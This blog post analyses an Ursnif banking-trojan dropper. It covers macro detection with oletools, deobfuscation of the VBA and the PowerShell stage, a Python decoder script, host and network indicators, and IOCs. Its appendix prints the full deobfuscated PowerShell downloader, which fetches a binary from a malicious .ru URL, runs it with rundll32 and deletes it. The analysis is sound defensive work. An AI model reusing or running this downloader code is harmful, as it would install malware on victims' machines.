---
published: true
layout: post_toc
title: Malware Analysis Ursnif Dropper
categories: Malware_Analysis
---
# Introduction 
Ursnif malware, also known as [Gozi](https://malpedia.caad.fkie.fraunhofer.de/details/win.gozi), Gozi-ISFB, Dreambot, Papras, and snifula, is a sophisticated type of banking trojan, stealer, and spyware. In 2020, it was identified as the second-most active strain of malware, accounting for over 30 percent of malware detections. What sets Ursnif apart is its long history in the cybercrime world, dating back to its initial appearance in 2000. Ursnif's longevity has made it one of the oldest malware families in existence, and its source code has been publicly disclosed on numerous occasions, leading to the creation of multiple variants. The Ursnif malware family now encompasses a growing number of highly effective strains, each with a diverse set of modular features. In this blog post, we'll explore the intricacies of Ursnif malware, including its history, evolution, and detection and mitigation strategies.

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper.png){:width="100%"}

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-1.png){:width="100%"}

One of the most prevalent ways that Ursnif infects its targets is through the use of malicious macros. The Ursnif dropper uses macros embedded in Microsoft Word or Excel documents to download the second-stage payload onto the infected system. Once the macro is executed, it will typically initiate a PowerShell command to download the payload.
In this blog post, we will explore how the Ursnif dropper uses macros and PowerShell to download the second-stage payload. 

---

# Analyzing the Ursnif Dropper

## Extracting the metadata of the document

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-2.png){:width="50%"}


```
exiftool 23-04-2020.doc
```

Using exiftool we can see the metadata of the document. We're looking for anomalies here and we can see that the docuemnt doesn't have author name, title, etc. We see alsos that the Words is 0 which is unusual for a document that doesn't contain any word. 

Let's use oletools to analyze the document.  

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-3.png){:width="50%"}


```
oleid 23-04-2020.doc
```

Using oleid, a script that analyzes OLE files to detect specific characteristics that are commonly found in malicious files,
The document contains suspicious Macros, as we can see. Let's extract and analyze the suspicious macros with olvevba.

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-4.png){:width="50%"}


```
olevba 23-04-2020.doc --detailed 
```

An AutoExec macro (a macro that you name [AutoExec](https://learn.microsoft.com/en-us/office/troubleshoot/word/autoexec-autoopen-macros-word)) runs before any other macros or modules in the database.  We can see that the document contains an AutoExec macro which name isfzcmxfkfkxlzd_gotfocus. This will be our entry point in analyzing the macros statically. The documents also contains interesting function calls such as [ShellExecute](https://learn.microsoft.com/en-us/windows/win32/shell/launch) and [GetObject](https://learn.microsoft.com/en-us/office/vba/Language/Reference/user-interface-help/getobject-function).

## Deobfuscating the VBA Macros

Extract the macro in text.
``pcode2code 23-04-2020.doc > malicious_macro.txt`

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-5.png){:width="100%"}


![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-6.png){:width="100%"}


The Macros contain a lot of junk codes and meaningless variables such as strings contains Array pattern. Simply deleting it will take care of the issue. **fzcmxfkfkxlzd_GotFocus** is a Autoexec Macro. this will be the entry point. Inside of it, it will call the main function which is the **ogadjbdlgduu**. 
[Obfuscating Layout](https://cybersecurity.springeropen.com/counter/pdf/10.1186/s42400-020-00049-3.pdf) technique in the code:
- Junk codes 
- Stripping Redundant Symbols
- Meaningless identifiers 

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-7.png){:width="100%"}


![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-8.png){:width="100%"}


We can see that our code is shorter after the junk codes have been removed. from more than 600 lines of code to just 33 lines. But still, the code is obfuscated. The data is encoded in the main function, which calls the **uxfajgqc** function to decode it. 

[Obfuscating data](https://cybersecurity.springeropen.com/counter/pdf/10.1186/s42400-020-00049-3.pdf) technique in the code:
- Array Transformation 
- Data procedurization
- Data encoding 
- Data splitting 


![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-9.png){:width="100%"}


**Deobfuscated uxfajgqc function**

The code accepts two parameter which is an array of encoded values, and the values from alternative.text function from the main function. The function's purpose is to decode a string of data encoded with a custom encoding scheme.

The function iterates through each character in the input array using a loop. Within the loop, the code computes 107 for the integer literal 64. It then generates a substitution table by converting the alternative text parameter to a string using the 107 value as the conversion type.
The code then computes the value of zero as 2 and creates an empty string variable called "empty" that contains the null character represented by the integer value zero. The loop continues until all of the characters in the input array have been processed, at which point the function returns the "final str" value.

We can figure out the values of the Alternative text by running the macros dynamically.


![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-10.png){:width="100%"}


Set a breakpoint before the Shell execute function and run the macros dynamically to get the values for *jnmquwwy* (lookup table) and *srnwrufymp* (Encoded base64 value).

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-11.png){:width="100%"}


![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-12.png){:width="50%"}


**Decoding the data using Python** 
We can simply use Python to decode the encoded variable after obtaining the value of the lookup table. Based on the decoded values, it appears that the macros will execute a PowerShell script command with elevated privileges and without user interaction while hiding the PowerShell console window from view and dealing with the directory path of the system32 folder.


## Deobfuscating the Powershell script 


![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-13.png){:width="100%"}


**Using CyberChef to decode the base64 PS script and remove the null bytes.**

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-14.png){:width="100%"}


**The Obfuscated Powershell script**

contains several unused variables and functions with obfuscated names. We can simply delete the junk codes and rename the variables. 

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-15.png){:width="100%"}


**Powershell script after deobfuscation.**

The PowerShell script executes a series of a task to download and register a binary file. 
The script  attempts to download the file from a specified URL. hxxp[://]to4karu[.]ru/ukhseigfuhasfoiuewgfuyasdfasuydfbu[.]bin. The function checks if the downloaded file is greater than or equal to 99463 bytes. If it is, the DLL file is registered using rundll32.exe, and the downloaded file is deleted. If an exception occurs during the download, the function waits for 5 seconds and then tries again. The function continues to run until the downloaded file is successfully registered and deleted.

---

# Running the Macros

## Host-based Indicators 

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-16.png){:width="100%"}


**Output of process hacker. Invokes powershell to download the payload.**

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-17.png){:width="100%"}


**Command line executed by powershell which is the encoded base64 download script** 

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-18.png){:width="100%"}


**Malicious payload is dropped in the user's profile directory.**


## Network Indicators 

![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-19.png){:width="100%"}


![]({{site.baseurl}}/assets/img/2023-02-28-Malware-Analysis-Ursnif-Dropper-20.png){:width="100%"}


**Procmon and Wireshark Packet capture of downloading the malicious payload.** 

---

# IOCs 
```
hxxp[://]to4karu[.]ru/ukhseigfuhasfoiuewgfuyasdfasuydfbu[.]bin
ujfnrhzvpittgwsj.bin
580776d602e2edd816472ca7b9f651740d24313477598c88cc8b9a04a1016394  23-04-2020.doc
```

---

# Appendices
## Deobfuscated PS script
---
```
$download_url = "http://to4karu.ru/ukhseigfuhasfoiuewgfuyasdfasuydfbu.bin";
$downloaded_file = "ujfnrhzvpittgwsj.bin";
$register_command = "$downloaded_file, DllRegisterServer";

# Download file from URL to user's profile directory
function download_file {
    while ($file_exists -eq $false) {
        try {
            $web_client = New-Object net.webclient;
            $web_client.DownloadFile($download_url, $downloaded_file);
            if ((Get-Item $downloaded_file).length -ge 99463) {
                $file_exists = $true;
                Start-Process -FilePath "rundll32.exe" -Args $register_command;
                delete_file;
                exit;
            }
        } catch {}
        sleep -s 5;
    }
}

# Delete downloaded file
function delete_file {
    try {
        sleep -s 10;
        Remove-Item -ErrorAction Stop -Path $downloaded_file;
    } catch {
        delete_file;
    }
}
download_file;
```
---
## Decoder.py
---
```
lookup_table = """ojqfiadxctxvppyfjmlpqkxqoialcrfhywepuacqrxrlcrdoepuauhdrhgnyfrzsoscshhqubokllhvvxhcvdk.zgvfpgxkuwmslwpjb-afyfahncmnfl sheyocykzanlrcecfddubovibwbdtihfddybyqieacockrljoygigimrvimsmdbxmcdpoeiar:kinjvbtt{wmjbuaiheij9kmlzkmbjpgkaBqmbsdlddqedtAzfakah0telnxj5epfngytq7jcpmnhoocikmsl2pmeyznFwpgamk6xcjchcyt8ghtdpxcq1ihqnvaeootgmheCyfpcgglpw4nzsekbszsbp3brdeqccjj}cuhruvchwot\jirscwqWeifadrmSuglngkhgkgtlvzyvakidqwhm"""

def data_decoder(array):
    string = ""
    for value in array:
        value -= 1
        string += lookup_table[value]    
    if array and string:
        print(string)

# xxtytqommjogvbx
print(data_decoder([13, 1, 34, 35, 30, 64, 32, 35, 19, 19, 87, 35, 8, 35]))
# fcvhjrsmilyq
print(data_decoder([105, 59, 1, 13, 118, 105, 35, 8, 35, 9, 118, 73, 15, 13, 6, 64, 64, 118, 105, 34, 5, 59, 118, 32, 5, 7, 7, 35, 59, 118, 105, 59, 1, 59, 5, 118, 105, 35, 118]))
# ywkkujfenopw
print(data_decoder([324, 192, 368, 376, 5, 59, 7, 1, 34, 64, 368, 384, 15, 64, 10, 35, 18, 346, 277]))
# GetObject
print(data_decoder([59, 35, 34, 192, 201, 213, 226, 239, 246, 253, 213, 262, 277, 105, 284, 291, 239, 300, 105, 309, 309, 324, 284, 105, 239, 334, 334, 277, 105, 246, 246, 239, 246, 324, 213, 246, 239, 300, 284, 346, 213, 356]))
```


--- 
# References
- https://otx.alienvault.com/indicator/file/931dbe630f2b06d47c8908f877edb16d
- https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3
- https://securityliterate.com/malware-analysis-in-5-minutes-deobfuscating-powershell-scripts/
- https://www.cisa.gov/uscert/ncas/alerts/aa22-216a
- https://courses.zero2auto.com/courses/adv-malware-analysis-course/340491-zero2hero